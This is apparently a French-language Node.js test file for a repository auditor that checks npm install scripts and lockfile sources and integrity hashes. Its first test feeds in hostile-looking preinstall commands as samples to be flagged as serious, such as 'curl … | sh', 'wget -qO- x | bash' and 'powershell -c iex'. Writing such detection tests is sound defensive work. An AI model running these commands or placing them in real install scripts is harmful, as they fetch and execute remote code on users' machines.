/**
 * Ce que `npm install` lance et d'où il télécharge (E-INSTALL-01/02, E-VERROU-01/02) : les scripts d'installation du dépôt, ceux de ses dépendances, et ce que le
 * fichier de verrouillage dit de l'origine et de l'empreinte de chaque paquet. Rien n'est bloquant ; un dépôt sans package.json ou sans verrou n'en dit rien.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { auditer, page } from './aide-surface.mjs';

const base = { 'index.html': page('<script src="app.js"></script>'), 'app.js': 'const a = 1;\n' };
const paquet = (scripts) => JSON.stringify({ name: 'w', version: '1.0.0', scripts, dependencies: { leftpad: '1.3.0' } }, null, 2);
const REGISTRE = 'https://registry.npmjs.org';
const entree = (nom, extra = {}) => ({ version: '1.0.0', resolved: `${REGISTRE}/${nom}/-/${nom}-1.0.0.tgz`, integrity: 'sha512-AAAA', ...extra });
const verrou = (packages, version = 3) => JSON.stringify({ name: 'w', lockfileVersion: version, packages: { '': { name: 'w' }, ...packages } }, null, 2);
const dit = (a, ...regles) => regles.flatMap((r) => a.de(r)).map((c) => `${c.regle} ${c.severite}${c.bloquant ? ' bloquant' : ''}`);

test('E-INSTALL-01 : un script d\'installation du dépôt est mineur, majeur s\'il télécharge ou exécute du texte ; les autres scripts ne disent rien', async () => {
  const sobre = await auditer({ ...base, 'package.json': paquet({ postinstall: 'node scripts/setup.js', build: 'node build.js', test: 'curl https://exemple.org' }) });
  assert.deepEqual(dit(sobre, 'E-INSTALL-01'), ['E-INSTALL-01 mineur']);
  assert.equal(sobre.de('E-INSTALL-01')[0].ligne, 5, 'la ligne du script dans package.json');
  for (const commande of ['curl -s https://exemple.org/i.sh | sh', 'wget -qO- x | bash', 'node -e "require(\'child_process\')"', 'powershell -c iex', 'echo aGk= | base64 -d']) {
    const a = await auditer({ ...base, 'package.json': paquet({ preinstall: commande }) });
    assert.deepEqual(dit(a, 'E-INSTALL-01'), ['E-INSTALL-01 majeur'], commande);
  }
  const aucun = await auditer({ ...base, 'package.json': paquet({ build: 'node build.js', prepare: 'husky' }) });
  assert.deepEqual(dit(aucun, 'E-INSTALL-01'), []);
});

test('E-INSTALL-02 : les dépendances qui déclarent un script d\'installation sont dites, en information', async () => {
  const a = await auditer({ ...base, 'package.json': paquet({}), 'package-lock.json': verrou({ 'node_modules/esbuild': entree('esbuild', { hasInstallScript: true }), 'node_modules/leftpad': entree('leftpad') }) });
  assert.deepEqual(dit(a, 'E-INSTALL-02'), ['E-INSTALL-02 info']);
  assert.match(a.de('E-INSTALL-02')[0].constat, /esbuild/);
  assert.doesNotMatch(a.de('E-INSTALL-02')[0].constat, /leftpad/);
});

test('E-VERROU-01 : un paquet téléchargé par http est majeur, hors du registre officiel (autre hôte, dépôt git) mineur ; le registre officiel en https ne dit rien', async () => {
  const a = await auditer({ ...base, 'package.json': paquet({}), 'package-lock.json': verrou({
    'node_modules/clair': entree('clair', { resolved: 'http://registry.npmjs.org/clair/-/clair-1.0.0.tgz' }),
    'node_modules/prive': entree('prive', { resolved: 'https://npm.exemple.org/prive/-/prive-1.0.0.tgz' }),
    'node_modules/depot': entree('depot', { resolved: 'git+ssh://git@github.com/x/depot.git#0123456789abcdef0123456789abcdef01234567' }),
    'node_modules/ok': entree('ok'),
    'node_modules/lien': { resolved: 'packages/lien', link: true },
  }) });
  const c = a.de('E-VERROU-01');
  assert.deepEqual(c.map((x) => `${x.severite} ${x.preuve.origine} ${x.preuve.noms.join()}`).sort(), ['majeur http clair', 'mineur ailleurs prive,depot']);
  assert.ok(c.every((x) => x.bloquant === false));
  const propre = await auditer({ ...base, 'package.json': paquet({}), 'package-lock.json': verrou({ 'node_modules/ok': entree('ok') }) });
  assert.deepEqual(dit(propre, 'E-VERROU-01', 'E-VERROU-02', 'E-INSTALL-02'), []);
});

test('E-VERROU-02 : un paquet du registre sans empreinte est mineur ; la version 1 du verrou est lue aussi', async () => {
  const a = await auditer({ ...base, 'package.json': paquet({}), 'package-lock.json': verrou({ 'node_modules/nu': entree('nu', { integrity: undefined }), 'node_modules/ok': entree('ok') }) });
  assert.deepEqual(dit(a, 'E-VERROU-02'), ['E-VERROU-02 mineur']);
  assert.deepEqual(a.de('E-VERROU-02')[0].preuve.noms, ['nu']);
  const v1 = await auditer({ ...base, 'package.json': paquet({}), 'package-lock.json': JSON.stringify({ lockfileVersion: 1, dependencies: {
    a: { version: '1.0.0', resolved: `${REGISTRE}/a/-/a-1.0.0.tgz`, integrity: 'sha512-AAAA', dependencies: { b: { version: '1.0.0', resolved: 'http://exemple.org/b.tgz', integrity: 'sha512-BBBB' } } },
  } }) });
  assert.deepEqual(dit(v1, 'E-VERROU-01'), ['E-VERROU-01 majeur']);
  assert.deepEqual(v1.de('E-VERROU-01')[0].preuve.noms, ['b']);
});

test('sans package.json, ou avec un verrou illisible, ces règles ne disent rien et ne lèvent rien', async () => {
  const nu = await auditer({ ...base });
  assert.deepEqual(dit(nu, 'E-INSTALL-01', 'E-INSTALL-02', 'E-VERROU-01', 'E-VERROU-02'), []);
  const casse = await auditer({ ...base, 'package.json': paquet({}), 'package-lock.json': '{ pas du json' });
  assert.deepEqual(dit(casse, 'E-INSTALL-01', 'E-INSTALL-02', 'E-VERROU-01', 'E-VERROU-02'), []);
});
